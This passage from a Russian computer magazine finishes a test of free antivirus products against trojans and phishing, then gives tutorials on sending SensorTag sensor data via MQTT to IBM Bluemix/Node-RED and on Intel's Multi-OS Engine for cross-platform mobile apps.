То же самое касается и сообщений о найденных угрозах. Они краткие и емкие,
включают названия всех обнаруженных объектов (даже нескольких в одном
источнике) и идентификатор обращающегося к ним процесса в памяти (PID).
Прямо из всплывающего окна можно выбрать желаемое действие, в том числе
уведомление о ложном срабатывании.
   Первый тест NANO
Антивирус     прошел
успешно.    Заражен-
ная  страница  не  за-
грузилась,  а  троянец
в  джава-скрипте  был
и д е н т и ф и ц и р о в а н
по сигнатурному совпа-
дению. Второй и третий
тесты тоже выполнены
на отлично: «наноанти-
вирус» оказался един-
ственным   участником
эксперимента,  полно-
стью    распознавшим
множественные угрозы,
присутствующие в коде                            Уведомление о множественных угрозах и выбор действий
одной   веб-страницы.
Однако следующие два
теста NANO Антивирус провалил. Он позволил выполнить зараженный скрипт
и запустить троян Hupigon, снова установивший бэкдор.





                                   NANO Антивирус в упор не видит троян

От фишинга NANO Антивирус защитить не смог. Поддельные страницы загру-
жались без предупреждения. Спасовал он и при проверке JAR-файла, оши-
бочно сообщив о его безопасности. В девятом тесте NANO Антивирус позво-
лил загрузить архив ZIP с зараженным джава-файлом, но обнаружил в нем
угрозу при выборочном сканировании по запросу.





                                                          Добивание вручную

Так же произошло и в последнем тесте. Протрояненный APK-файл загрузился
без проблем, но был идентифицирован как опасный при ручном сканировании.





                                     Обнаружение Trojan.SMS при ручной проверке


Общий результат: 5 из 10 тестов пройдены успешно, при этом в двух случаях
для обнаружения угроз потребовалась ручная проверка. Защита от фишинга
не работает.

TENCENT PC MANAGER V.11.4.
Телеком-оператор Tencent (Шэньчжэнь, Китай) утверждает, что его бесплат-
ный антивирус PC Manager одновременно использует четыре антивирусных
движка. При проверке оказывается, что первые три — это разделенный на мо-
дули Tencent engine (облачный, локальный + сервис восстановления системы),
а четвертый — лицензированный у BitDefender. То есть принципиально разных
движков в нем все-таки два, но собственный един в трех лицах.





                                               Псевдополноприводной антивирус


При установке антивирус занимает 245 Мбайт. Как и у многих приложений в сти-
ле Metro, все настройки Tencent PC Manager скрываются под небольшой кноп-
кой в правом верхнем углу экрана. Параметры, настраивающие защиту во время
веб-серфинга, находятся в разделах Realtime protection и Download protection.
Первый пункт я оставил как есть, а второй настроил так, что антивирус стал про-
верять все скачиваемые из интернета файлы независимо от их типа.





                                                  Настройки Tencent PC Manager


Первые десять тестов Tencent провалил... стоп! Их же всего десять! Неужели
мы нашли абсолютного чемпиона наших обзоров, занявшего почетное первое
место (с конца)?





                                            Tencent не знает, зачем здесь все эти файлы

Попробуем проверить файлы из каталога «Загрузки» вручную.





                                                           Полцарства за коня!

Вот так уже лучше: PC Manager обнаружил трояна в APK-файле. Теперь запу-
стим полную проверку системы.





        Сканер Tencent находит часть того, что пропустил его резидентный модуль защиты


Всего было обнаружено шесть угроз, включая зараженные джава-скрипты
и изменения в автозагрузке. Клик, и все они успешно устранены. Интересно,
почему все это время модуль «защиты» в реальном времени сохранял буд-
дистское спокойствие?
   Смотрим настройки по умолчанию еще раз. Видим пункт «Проверять боль-
ше типов файлов» — каких именно? Где список расширений проверяемых
файлов? Нет его. Зато есть виртуальная машина, в которой антивирус сначала
пропустил все десять угроз, а затем устранил шесть из них при ручном скани-
ровании.
   Попробуем сделать еще один клон с чистой «десятки» и повторить экспе-
римент, настроив антивирус Tencent на максимальное обнаружение.





                                                         Оказывается, защита есть!

С такой конфигурацией Tencent PC Manager в первом тесте успешно опреде-
лил вредоносный джава-скрипт. Во втором тесте он обнаружил и устранил
множественные угрозы, последовательно сообщив о них отдельными всплы-
вающими окнами. В третьем тесте зараженный скрипт также был помещен
в карантин, однако уже следующий тест оказался провален. В пятом тесте тро-
ян Hupigon снова прописался в системе. Защита от фишинга (тесты 6 и 7)
не сработала. Зараженный JAR-файл тоже загрузился беспрепятственно
как в чистом виде, так и внутри ZIP-архива. Протрояненный APK-файл Tencent
ошибочно признал чистым.
   Параноидальные настройки защиты в реальном вре-
мени немного изменили ситуацию. С ними Tencent PC
Manager смог предотвратить заражение уже в трех слу-
чаях из десяти, при том что сканирование по запросу
также определяло шесть угроз.
  Общий результат: 0/10 защита в реальном време-                                                DANGER
ни (RTP) с настройками по умолчанию; 3/10 для RTP
в агрессивном режиме и 6/10 при сканировании вруч-      База Clean MX также
                                                                          содержит ссылкиную.                                                                           на подозрительные
                                                                                   веб-сайты,
ЭТО КОНЕЦ!                                                     распространяющие
                                                                      новые модификацииВ конце всех тестов я решил дать антивирусам возмож-
                                                                       вредоносных объектов.
ность реабилитироваться и найти пропущенные вредо-                                                                           Поначалу они могут
носные объекты в ходе полного сканирования системы.        не определяться
Если делать поблажку, то уж всем одинаковую. ClamWin,     ни одним антивирусом
                                                                        даже на уровнеFortiClient и NANO Антивирусу это не помогло — их ре-                                                                                   эвристики.
зультаты остались прежними. Tencent PC Manager ре-        Отрицательный
зультаты улучшил, но в целом он ведет себя как опытный      результат на VirusTotal
                                                                еще не гарантируетвредитель: создает иллюзию защиты, пропуская в на-                                                                               безопасность
стройках по умолчанию абсолютно все. Настраивать па-                                                                         проверенного сайта или
раноидальный режим или вручную сканировать файлы            файла.
пользователь еще должен захотеть.

ВЫВОДЫ
ClamWin Free Antivirus и Clam Sentinel оказались любопытной связкой, но не бо-
лее того. Она пропускает угрозы для Windows через одну, не препятствует
загрузке фишинговых страниц, а также игнорирует зараженные приложения
для ОС Android. Использовать Clam Sentinel для защиты в реальном времени
вряд ли стоит. Зато ClamWin можно применять в качестве дополнительного
антивирусного сканера, доступного в виде портейбл-приложения.
    FortiClient оказался на удивление эффективным, но малоинформативным
и плохо локализованным антивирусным решением. Он распознает угрозы раз-
ных типов, включая «непрофильные» для Windows. Также он обеспечил защиту
от фишинга и набрал больше всех очков, промахнувшись лишь раз. Однако
для заражения компьютера этого раза вполне достаточно, так как дополни-
тельных средств защиты FortiClient не имеет.
  NANO Антивирус производит впечатление удачной за-
думки в начале сложного пути ее воплощения. Отличный ин-
терфейс, удобные настройки, информативные сообщения,
но пока еще низкая оптимизация кода, малоэффективное
распознавание угроз и полное отсутствие защиты от фи-
шинга.
                                   WWW   Tencent PC Manager оказался китайским антивирусом
в плохом смысле этого выражения. В настройках по умол-                                                                               Антивирус
чанию он вообще никак не воспрепятствовал группово-        ClamWin
му изнасилованию Windows 10 через браузер Edge. Одна-
                                                                         Модуль Clamко при ручной проверке он все же зафиксировал ее побои                                                                                                Sentinel
и даже немного подлечил. Параноидальные настройки за-
ставляют его иногда кричать «Стоп!» в аналогичных ситуа-     Облачный анти-
                                                                              вирус FortiClientциях, но в целом с ними становится только хуже. Антивирус
сам начинает истязать диск, по которому все так же почти                                                                                      Tencent PC
беспрепятственно скачут табуны освоившихся троянов.              Manager
   Из протестированных сегодня антивирусов я бы не ре-
                                                            NANO Антивирускомендовал  использовать ни  один,  если  только  тебе
не хочется испытать новые ощущения. Традиционный об-
зор положений о приватности в этом обзоре упразднен.
Все бесплатные антивирусы отправляют своим разработчикам «аноним-
ную» статистику и образцы файлов. Иногда это можно отключить в настрой-
ках, но гарантированно запретить — только отдельным файрволом. При этом
перестанет работать облачная проверка и наверняка возникнут другие
проблемы — например, с обновлением баз и проверкой лицензий.
КОДИНГ
ТВОЙ ПЕРВЫЙ
ИНТЕРНЕТ
                ЧАСТЬ 2

                  ЗАВЕРШЕНИЕВЕЩЕЙ
                     ПРОЕКТА:
                  ВОСПАРЯЕМ
                     К ОБЛАКАМ





                                     Дмитрий Коржавин
                                                   dmitriycor@hotmail.com

ИНТРО
В прошлой  статье  (апрель-
ский    номер)   мы    со-
брали   сеть   из   датчиков
и  андроидофона  с  исполь-
зованием BLE (Bluetooth Low
Energy, Bluetooth Smart). Мы
поюзали SensorTag 2 от Texas
Instruments  и  ознакомились
с  характеристиками  и  про-
филями BLE. Узнали мы и то,
как можно принимать и пе-
редавать данные через BLE
на Android с железа. Сегод-
ня полученные SensorTag’ом
данные об окружающей среде
свяжем через смартфон c не-
большим облачным сервисом.
Так  сказать, добавим слово
Internet в аббревиатуру IoT.


         IoT с использованием облака





                                                         Индустриальный IoT

ПЛАН ДЕЙСТВИЙ
1. Сначала мы принимаем данные от BLE-устройства (SensorTag 2) на телефон.
2. Затем мы должны передать данные с нашего андроидофона в облако.
3. И наконец, сделать облачный веб-сервис, для того чтобы можно было сле-
   дить за показателями нашего SensorTag в любой интернетизированной точ-
   ке мира. В итоге у нас должна получиться система, представленная на рис. 1.





                                                         Рис. 1. Архитектура системы

ОБЗОР ТЕХНОЛОГИЙ
У нас уже есть полученные  от SensorTag 2 данные, и в приложении
SensorTagApp на андроидофоне мы можем наблюдать графики наших харак-
теристик (температура, влажность, давление и прочее). Теперь можно отпра-
вить данные в облако, просто сдвинув переключатель Push to Cloud на экране
нашего приложения. Мы можем перейти по этой ссылке или нажать на ссыл-
ку Open in browser в приложении. После этого нас перекинет на тест-странич-
ку от IBM, на которой нужно будет ввести MAC-адрес (указан в приложении
в поле Device ID). Теперь нажимаем кнопку Go на нашем SensorTag и с радо-
стью наблюдаем показания сенсоров уже в интернете, в облачном сервисе —
правда, пока не в нашем. Не беспокойся — до «нашего» облака мы сегодня
тоже долетим, просто перед тем, как двигаться дальше, нам надо понять одну
вещь: что именно происходит внутри нашего приложения, когда мы отправля-
ем в интернет данные, поступившие на телефон по BLE.
   Для этого мы используем протокол MQTT и формат передачи данных JSON.





         Рис. 2. Приложение SensorTagApp        Рис. 3. MAC-адрес (Device ID) SensorTag


Протокол MQTT
MQTT (Message Queue Telemetry Transport) — упрощенный протокол сетевого
уровня для обмена сообщениями между устройствами. Этот протокол рабо-
тает поверх стека TCP/IP и разработан для преодоления проблем, связанных
с подключением быстро растущего числа датчиков, микрокомпьютеров, при-
водов, телефонов, планшетов. В настоящее время MQTT — наиболее распро-
страненный протокол для организации IoT-инфраструктуры.





                                                     Рис. 4. Описание протокола MQTT

MQTT устроен по принципу издатель/подписчик (publisher/subscriber): изда-
тель (устройства типа publishers) отправляет сообщение, которое публикуется
в централизованном сервисе (брокере сообщений), а подписчик (устройства
типа subscriber) получает сообщение из брокера. Для использования брокера
MQTT необходимо пройти процедуру подписки на определенные темы публи-
куемых сообщений.
   Небольшие накладные расходы, связанные с хорошо
продуманным форматом заголовков, позволяют эффек-     Стандартные порты
тивно применять этот протокол для решений интернета     для MQTT — это порт
                                                                       1883 и порт 8883вещей. Эксперименты показывают, что протокол облада-
                                                                           для MQTT через SSL.
ет незначительными накладными расходами на стороне
устройства, благодаря чему расход энергии аккумулятор-        Подробнее
ной батареи снижается и увеличивается количество пере-        о протоколе
                                                                     можно узнатьдаваемых в единицу времени сообщений. В связи с этим                                                                            на официальной
мы будем использовать протокол MQTT для транспорти-       страничке MQTT
ровки пакетов данных и команд между андроидофоном
и аналитическими средствами облачной платформы.

Формат JSON
JSON (JavaScript Object Notation) — текстовый формат обмена данными, осно-
ванный на JavaScript и обычно используемый именно с этим языком. Как и мно-
гие другие текстовые форматы, JSON легко читается людьми. Несмотря на про-
исхождение от JavaScript (точнее, от подмножества языка стандарта ECMA-262
1999 года), формат считается независимым от языка и может использоваться
практически с любым языком программирования. Для многих языков существу-
ет готовый код для создания и обработки данных в формате JSON.
   JSON-текст представляет собой (в закодированном виде) одну из двух
структур:

1. Набор пар ключ — значение. В различных языках это реализовано как объ-
ект, запись, структура, словарь, хеш-таблица, список с ключом или ассоциа-
тивный массив. Ключом может быть только строка (регистрозависимая: имена
с буквами в разных регистрах считаются разными), значением — любая форма.

2. Упорядоченный набор значений. Во многих языках это реализова-
но как массив, вектор, список или последовательность. Это универсальные
структуры данных: как правило, любой современный язык программирования
поддерживает их в той или иной форме. Они легли в основу JSON, так как он
используется для обмена данными между различными языками программиро-
вания.

Вот данные, полученные от SensorTag в формате JSON, которые мы передаем
в облако:





ANDROID-КЛИЕНТ
Наиболее распространенной реализацией протокола MQTT является библи-
отека Paho MQTT. Библиотека реализована для наиболее популярных языков
программирования: C/C++, Java, JavaScript, Python, Lua, Go, C#. Ее мы и ис-
пользуем в приложении.
  В нашем приложении в классах IBMIoTCloudProfile и IBMIoTCloudTableRow
содержится функциональность для связи с облаком. Посмотрим же на код по-
ближе:





Названия классов и функций говорят сами за себя, и ты всегда сможешь по-
смотреть реализацию MQTT-клиента в коде приложения.

НА СТОРОНЕ ОБЛАКА
Хаб/gateway-устройство (андроидофон) формирует пакеты MQTT и передает
их в облако для хранения и обработки. Обратно из облака хаб может получать
команды для управления устройствами или для себя.
   Давай теперь сами создадим свой веб-сервис, чтобы принимать и отобра-
жать показания наших сенсоров. Для этого мы будем использовать облачную
платформу от IBM — Bluemix, но можно взять и Azure от Microsoft, или AWS
от Amazon, или Heroku от... Heroku?! :) В общем — это дело вкуса.
   Облачная платформа IBM Bluemix нужна нам для реализации серви-
сов хранения, аналитической обработки и визуализации данных, полученных
из SensorTag и прокачанных через андроидофон.

I’M BLUE!
Bluemix — это открытое облачное предложение типа PaaS (Platform as a
Service) на базе проекта с открытым исходным кодом Cloud Foundry. Эта плат-
форма предназначена для разработки и хостинга приложений, также она упро-
щает управление инфраструктурой. Она позволяет быстро создавать и раз-
вертывать приложения и управлять ими.

Возможности Bluemix

• быстрое и инкрементное составление приложений из сервисов;
•  непрерывное внесение изменений в приложения и обеспечение постоян-
   ной доступности;
•  поддержка высокоспециализированных моделей программирования и сер-
   висов для конкретных рабочих нагрузок;
•  встраивание высокой степени управляемости в сервисы и приложения;
•  оптимизация и эластичная адаптация к рабочей нагрузке.


Платформа Bluemix достигает описанных целей посредством абстрагирова-
ния и скрытия большинства сложностей, традиционно сопутствующих хостингу
приложений в облаке и управлению ими в облачной среде. Bluemix может быть
использована разработчиками для создания самых разных приложений, вклю-
чая веб-приложения, мобильные приложения, приложения для работы с боль-
шими данными, приложения для разумных устройств и так далее. Она поддер-
живает  разработку на популярных  языках программирования и средах
разработки. Java-технологии, средства создания серверных частей для мо-
бильных приложений, мониторинг приложений, технологии с открытым исход-
ным кодом — все эти возможности доступны в облаке как сервисы.
   Каталог  Bluemix  содержит  почти  все необходимое
для быстрого начала работы: большое количество шабло-
нов, заранее сконфигурированных наборов сервисов, при-
меров кода, готовых к использованию сред исполнения (в
том числе Liberty for Java, Node.js, Ruby on Rails), веб-серви-
сов и сервисов приложений (Data/Session Cache, ElasticMQ,
Decision, SSO, Log Analysis, Redis, RabbitMQ, Twilio), мобиль-        INFO
ных сервисов (в том числе push-уведомлений, Cloud Code,                                                                         Вместо IBM Bluemix
Mobile Application Management, Mobile Quality Assurance),                                                                     можно попробовать
сервисов управления данными (в том числе MongoDB, ре-     и другие облачные
ляционная база данных от IBM, JSON базы данных от IBM,         технологии,
                                                                        например Heroku или
MySQL, PostgreSQL,  MobileData,  MobileSync, BLU Data                                                                                               Azure.
Warehouse, MapReduce), сервисов мониторинга и анализа
сервисов DevOps Services (прежнее название JazzHub).

Краткое описание концепций Bluemix
В терминологии Bluemix приложение (application) — это созданный нами весь
программный код (исходный код или исполняемые двоичные файлы), который
необходимо запустить или на который нужно сослаться в процессе исполне-
ния. Мобильные приложения выполняются за пределами среды Bluemix и ис-
пользуют сервисы, представленные приложениями. В случае веб-приложений
приложение — это код, загруженный на платформу Bluemix с целью хостинга.
Кроме того, платформа способна осуществлять хостинг программного кода
приложения, который мы хотим выполнять на внутреннем сервере в среде
на базе контейнера.
   Сервис (service) — это код, работающий на платформе Bluemix и предла-
гающий определенную функциональность, которую могут использовать при-
ложения. Это может быть готовый сервис, используемый непосредственно,
например push-уведомления для мобильных приложений или эластичное ке-
ширование для веб-приложения. Мы также можем создавать собственные сер-
висы в диапазоне от простых служебных функций до сложной бизнес-логики.
   Организация (organization) и пространство (space) — это организационные
единицы инфраструктуры, способные хранить и отслеживать ресурсы прило-
жения. Организация содержит домены (domain), пространства и пользовате-
лей, пространство — приложения и сервисы. По
   умолчанию используется три пространства: Development (разработка),
Production (производство) и Staging (подготовка). Для приложений, которым
требуется среда типа PaaS, предоставляются buildpack-пакеты — наборы
скриптов для подготовки кода к исполнению на целевой PaaS-платформе.
   Buildpack-пакеты, которые включают необходимую нашим приложениям
среду исполнения и могут также содержать специализированные инфраструк-
туры, упрощают развертывание приложения в облаке по сравнению с само-
стоятельной установкой и конфигурированием среды исполнения.
   Использование сервисов в Bluemix включает три этапа:
1. Сообщаем платформе Bluemix, что нам требуется новый экземпляр серви-
   са, и указываем, какое конкретное приложение будет использовать этот но-
   вый экземпляр.
2. Bluemix автоматически инициализирует новый экземпляр этого сервиса
   и связывает его с приложением.
3. Приложение взаимодействует с сервисом.

Пакеты сервисов (Service bundles) — это коллекции API интерфейсов, исполь-
зуемых в конкретных областях. Например, пакет Mobile Services включает сер-
висы MobileData, Cloud Code, Push и Mobile Application Management. Доступ-
ные сервисы и среды исполнения представлены в каталоге Bluemix. Кроме
того, мы можем зарегистрировать и собственные сервисы.





  Рис. 5.
  Bluemix


Выбор языка и среды исполнения
IBM Bluemix поддерживает множество платформ и языков программирования
серверной части. Мы же выберем Node-RED. Полную информацию о Node-
RED можно узнать на сайте. Я выбрал его из-за удобства и несложности на-
стройки (напоминает LabView). У него удобный графический интерфейс про-
граммирования, состоящий из блоков JS, описать которые можно путем
загрузки JSON-файла. Разумеется, ты можешь использовать и какой-нибудь
Node.js :).
   Данные из MQTT-пакета поступают в брокер в составе сервиса IoT
Foundation. Подписчиком данных является приложение Node-RED, которое
позволяет манипулировать ими с помощью простых визуальных средств. Мно-
жество примитивных обрабатывающих блоков (нодов) представляют собой
JavaScript-приложения, связанные друг с другом потоками данных.

Запускаем облако
Чтобы начать работу с Bluemix, нужно:
1. Зайти на сайт.
2. Зарегистрироваться и создать учетную запись (кноп-
   ки Sign Up или Log in, если уже есть учетная запись).
  Ниже на странице расположены полезные учебные
   видеоматериалы.
                                   WWW3. При регистрации заполнить все нужные поля (все
   стандартно). После регистрации на указанный email                                                                                  Bluemix и уроки
   придет сообщение о регистрации, и нужно будет под-    по созданию облачных
   твердить свою учетную запись, перейдя по ссылке,          сервисов
   указанной в сообщении.                                                                         Описание
4. После регистрации мы получим доступ  к Bluemix       MQTT-протокола
   для разработки приложений с двумя гигабайтами па-
   мяти во время выполнения и контейнер, а также до десяти подготовленных
   служб Bluemix. Бесплатно и на месяц.
5. На панели управления приложениями и службами (вкладка Dashboard)
   создать IBM cloud service Internet of Things (как сервис) и назвать любым
   именем.
6. Нажать кнопку Launch (теперь у нас есть постоянно запущенная служба,
   из которой наше приложение будет брать данные).
7. Из Dashboard cоздать приложение Node-RED (выбрать node-red app), на-
   жать Start, перейти по ссылке, которая имеет вид наподобие ИмяПриложе-
   ния.eu-gb.mybluemix.net, и открыть в редакторе (нажать на большую красную
   кнопку Go to your Node-RED flow editor). Для создания облачного приложе-
   ния требуется время. У меня это заняло пять минут.
8. Справа в верхней части редактора нажать кнопку «бутерброд»    import
   clipboard.
9. Перейти по ссылке на GitHub, на странице найти пункт Steps to import the
   Node-RED flow и скопировать JSON-текст, который находится в поле в этом
   пункте.
10. Перейти обратно в редактор приложения Node-RED и вставить JSON-текст
   в поле Paste nodes here в окне Import nodes, нажать Ok (можно было добавить
   узлы, «перетаскивая» из панели узлов, находящейся слева в редакторе).
11. На рабочем пространстве редактора появится наше приложение, состоя-
  щее из узлов (nodes), логику которых можно менять, используя JS.
12. Щелкнуть на самом левом узле (TI Sensortag, это как раз наша IoT-служ-
   ба, которую мы запустили ранее) и ввести в поле Device Id наш MAC-адрес
   SensorTag, например AA:BB:CC:DD:EE:FF без двоеточий.
13. Задеплоить (нажать на кнопку Deploy).





                                              Рис. 6. Node-RED приложение и редактор


Наконец наше облачное приложение запустилось и работает (отключить его
можно кнопкой Stop из Dashboard), и теперь, если у нас включен SensorTag,
который передает данные на телефон, и есть телефон, который передает
данные в интернет, мы можем наблюдать, как у нас в приложении Node-RED
на вкладке Debug (справа) приходят наши данные в формате JSON. Теперь мы
можем добавить, например, HTML-страничку и отображать координаты нахож-
дения телефона и данные с датчиков, как описано здесь,
из любой точки земного шара, используя адрес нашего
приложения ИмяПриложения.eu-gb.mybluemix.net. Там
же приводится несложный пример с узлом twillio, который
позволяет отправлять СМС-оповещение (допустим, о пре-
вышении температуры) с использованием Twillio API (нуж-
                                                         INFOно просто ввести в узел twillio api-key, полученный при ре-
гистрации на сайте, номер телефона, на который придет       Наряду с MQTT
СМС или голосовое оповещение, и сам текст послания).    можно использовать
                                                                        и другие протоколы,Можно попробовать анализировать данные и строить гра-                                                                        например protobuf
фики, предсказывая значения параметров с помощью      (Google) или AllJoyn
языка R, как описывается здесь. Или сделать что-то свое.        (AllSeen Alliance).

ИТОГИ
Вот мы и создали свой маленький интернет вещей. Облачные и вообще техно-
логии помогут тебе реализовать идеи, сервисы и приложения, которые нужны
людям и которых еще не видел мир. Технологии никогда не спят, и спектр их
применения постоянно растет. Так что в 2020 году, возможно, из созвездия 50
миллиардов устройств интернета вещей несколько будут и твоими.
КОДИНГ
MULTI-OS ENGINE
TECHNOLOGY
КРОСС-ПЛАТФОРМЕННЫЕ
ПРИЛОЖЕНИЯ
ОТ INTEL: ОЖИДАНИЯ
И РЕАЛЬНОСТЬ





  Юрий «yurembo» Язев
           t2d-dev.ru





Фреймворк Multi-OS Engine — технология Intel, предназна-
ченная для разработки кросс-платформенных мобильных
приложений для iOS и Android из-под Windows или OS X.
Работая с Multi-OS Engine, ты можешь использовать весь
свой опыт разработки на Java для создания iOS-прило-
жений (Android подразумевается по умолчанию). По сути,
Multi-OS Engine представляет собой плагин для среды
разработки Android Studio. При этом для каждой из плат-
форм на выходе получаются нативные приложения, ко-
торые выглядят и взаимодействуют специфическим
для определенной операционной системы образом.


В зачаточном виде Multi-OS Engine была представлена летом прошлого
года. Почти за год эта технология развилась во вполне сформировавшую-
ся программную систему и достигла пререлизной версии. Пока она полно-
стью бесплатная, поэтому имеет смысл обратить на нее свое внимание  :).
Multi-OS Engine входит в пакет инструментов INDE (Integrated Native Developer
Experience), который состоит из всевозможных компиляторов, отладчиков,
средств профилирования, пакетов разработчика, библиотек и других тулз,
помогающих в разработке высокопроизводительных нативных приложений
для любой поддерживаемой платформы, где установлен процессор от Intel.
   Ближайший конкурент Multi-OS Engine — Xamarin, теперь встроенный
в Visual Studio для Windows и по-прежнему тусующийся в системе програм-
мирования Xamarin Studio в OS X. В конце марта, когда случился Build 2016,
Xamarin объявила, что снимает все ограничения со своих бесплатных инстру-
ментов на построения приложений, в том числе на их размер. Это также ка-
сается интегрированных в Visual Studio (любых версий) инструментов. Со-
впадение? Не думаю. Несмотря на то что Xamarin также создает нативные
приложения для iOS и Android, использует он при этом C#. Ни о каких сравни-
тельных тестах мне пока не известно, поэтому на данный момент все ограни-
чивается субъективным выбором любимого языка и среды разработки.
   Multi-OS Engine полностью избавляет от использования Obj-C при раз-
работке приложений для iOS. Это достигается путем генерации связующего
Java-кода на основе заголовков Obj-C и C. Кроме того, Multi-OS Engine под-
держивает использование Java-аннотаций, а связь Java-кода с нативным по-
средством библиотеки NatJ избавляет от необходимости вызовов JNI. Вдо-
бавок фреймворк содержит подготовленные jar-файлы для взаимодействия
с iOS API. Тем самым он полностью покрывает последний.

ПОДГОТАВЛИВАЕМ СРЕДУ РАЗРАБОТКИ
Поскольку в Windows нет iOS-симулятора, я буду проводить сегодняшние экс-
перименты в среде OS X. Однако даже если у тебя нет макинтоша, действия
в ОС Windows будут такими же. Кроме того, чтобы построить приложение
для iOS из Windows, можно воспользоваться облачным сервисом — смотри
об этом на врезке, а я пока перейду к обзору инструментов.
  В первую очередь тебе понадобится Android Studio. Плагин Multi-OS Engine
поддерживается версиями начиная с 1.2, но мы воспользуемся последней
имеющейся в наличии. На момент написания статьи это была 2.1.1. Итак, пе-
реходим на сайт Android Studio и качаем последнюю версию пакета. Прежде
чем приступить к установке, проверь версию Java SDK, установленную на тво-
ем маке (javac -version в терминале), и, если она ниже 1.8, обнови. Далее
двойным щелчком по пакету dmg запусти установку. В появившемся окне пе-
ретащи Android Studio в папку Application.
   После запуска Android Studio тебе будет предложено провести стандартную
настройку студии: скачивание и установка инструментов SDK, Android-плат-
форм и инструментов построения. В общем, все обычно.
   Перейдем  к установке непосредственно плагина. Его можно скачать
со страницы. На ней нажми кнопку Get Multi-OS Engine, заполни форму, ука-
зав валидный email, имя, фамилию — по желанию, нажми Submit, на следую-
щей странице выбери свою целевую операционную систему и жми Download
Now. В моем случае операционная система OS X, следовательно, установоч-
ный пакет для нее я и качаю. В установке плагина также нет ничего сверхъе-
стественного: двойным кликом по файлу m_multi_os_engine-1.0.648 от-
крываем установочный диск, откуда выбираем Multi-OS Engine Installer
1.0.648. Запустится инсталлятор, на первой странице которого надо ввести
пароль администратора, потом будет окно приветствия, окно для задания пу-
тей к инструментам: JDK, Android SDK, Android Studio, затем подтверж-
дение и, наконец, установка. После этого можно запускать студию и пользо-
ваться средствами плагина.

РАЗРАБОТКА ПРОСТОГО КРОСС-ПЛАТФОРМЕННОГО ПРИЛОЖЕНИЯ
Android-версия
Соберем минимальное кросс-платформенное приложение, чтобы почув-
ствовать принципы работы с Multi-OS Engine. По сути, кросс-платформен-
ное приложение для iOS и Android состоит из платформозависимых модулей
для конкретной операционной системы и общего кода, часть которого может
составлять 60%. Остальные 40% приходятся на пользовательский интерфейс,
который по определению специфичен для каждой операционной системы.
   Пусть наше минимальное приложение имеет общий модуль на Java, кото-
рый используется в двух смежных проектах Multi-OS Engine на Android и на iOS.
Создай новый Android-проект в Android Studio. В мастере на втором шаге
выбери подходящую версию SDK. Для тестирования на реальном девайсе я
возьму API 19: Android 4.4 (KitKat), поскольку Android-эмуляторы на OS X рабо-
тают крайне медленно. А на странице выбора добавляемой активности укажи
Empty Activity.
   Теперь перейдем к созданию модуля общей функциональности. С помо-
щью контекстного меню (на iOS-модуле) New   Module открой окно Create
New Module, там выбери пиктограмму Java Library. На следующем шаге задай
имя библиотеки и Java-класса, в моем случае это сommon и commonLogic. По-
сле создания дополнительного модуля позволь системе Gradle синхронизи-
роваться. Сейчас надо написать функциональность, которая будет одинаково
служить обоим приложениям, то есть общую функциональность. Для приме-
ра пусть возвращает строку. Открой файл с кодом (в моем случае: common
java   com.example   commonLogic). Там имеется класс commonLogic, вставь
в него следующий код:





Все очень просто, объявляем переменную, в конструкторе инициализируем
ее, в методе getLine возвращаем ее значение.
   Теперь в Android-приложение просто добавим кнопку, в результате кли-
ка по которой обратимся к модулю общего кода и выведем из него строку на
экран девайса. Открой activity_main.xml в режиме дизайнера. В визуаль-
ном редакторе добавь кнопку, перейди в редактор кода MainActivity.java,
в раздел импортирования добавь





Обрати внимание: в последней строчке подключается модуль общего кода.
Затем в начале класса MainActivity объяви следующие объекты:




В конце метода onCreate добавь инициализацию переменных визуальными
объектами и обработчик события нажатия на кнопке:





Внутри него в созданную по умолчанию строковую метку выводится строка,
полученная из общего модуля кода.

iOS-версия
После создания Android-проекта надо добавить Multi-OS Engine модуль
для построения iOS-приложения. Для этого из контекстного меню панели
Project выбери New   Multi-OS Engine Module. В открывшемся мастере New
Module в левой панели выбери (тип проекта) Multi-OS Engine, а справа (заго-
товка iOS-приложения) Single View Application with Storyboard. На следующей
странице заполни поля для Xcode-проекта. Для редактирования его пользова-
тельского интерфейса можно воспользоваться Xcode. После этого останется
пара шагов для ввода имени модуля и задания пути, в результате будет создан
iOS-проект.





                                                          Создание iOS-модуля

Следующим действием надо подключить модуль общего кода для обоих проек-
тов. В контекстном меню выбираем пункт Open Module Settings, в открывшем-
ся окне надо последовательно выбрать в списке слева оба проекта-модуля
(app — Android-проект и iOS, соответственно, iOS-проект). Для каждого, пере-
ключившись на вкладку Dependencies, нажать иконку с плюсом, находящуюся
под списком, в результате появится ниспадающий список, в котором нам нужен
пункт Module dependency. Откроется новое окно для выбора модуля. В обоих
случаях надо выбрать строчку common. Кроме того, для модуля common надо
указать, какой версией Java-компилятора он будет компилиться. Для этого от-
крой его Gradle-скрипт (Gradle Scripts > build.gradle (Module: common)) и до-
бавь в него (сразу после блока dependencies) следующие строки:





Gradle потребует синхронизации.
   Сейчас можешь протестировать Android-приложение; делает оно пока не-
много, зато демонстрирует использование кода из общего модуля.
   А вот теперь нас поджидают траблы :). То, что написано в документации,
не согласуется с реальным положением дел. Что ж, это вполне понятно, вер-
сия плагина не финальная. Например, у нас на данный момент нет возможно-
сти применить UI Builder (встроенный в Android Studio конструктор) для постро-
ения пользовательского интерфейса. И хотя в подпапке iOS    build   Xcode
создается файл iOS.xcodeproj, который можно открыть с помощью Xcode,
пользы от этого мало. Между тем у нас есть возможность смоделировать ин-
терфейс — разместить нужные элементы, однако плагин не создает ни заго-
ловочных файлов, ни файлов реализации контроллера вида.
   Зато у нас есть возможность протестировать iOS-приложения прямо
из Android Studio. В выпадающем списке на панели задач можно выбрать те-
стируемое приложение. Кроме того, можно настроить конфигурацию устрой-
ства/эмулятора: выбрать версию ОС, порт и прочее. Однако, запуская
iOS-эмулятор из Android Studio, будь готов ждать несколько минут, пока он за-
грузится: он работает реально медленнее, чем из-под Xcode.

ХРАНЕНИЕ ДАННЫХ
Сделаем оговорку: обозреваем только те дополнительные возможности, ко-
торые реально работают :). На Android и iOS это, во-первых, общий код для со-
хранения и загрузки данных в локальное хранилище. Кроме того, как на Android,
так и на iOS прекрасно работает встроенная база данных SQLite, при этом
для доступа к ней применяется один и тот же код на Java, который в обоих слу-
чаях на нижнем уровне использует драйвер из Java SDK. Между тем для по-
строения пользовательского интерфейса применяется платформозависимый
код, как мы это видели выше.

ГРАФИКА OPENGL
Скажем и несколько слов о визуализации. Сначала рассмотрим платформо-
зависимую часть. Для использования OpenGL в iOS-приложениях использует-
ся фреймворк от Apple GLKit. Он упрощает создание основанных на шейдерах
графических приложений. Рассмотрим небольшой список классов и предо-
ставляемую ими функциональность.
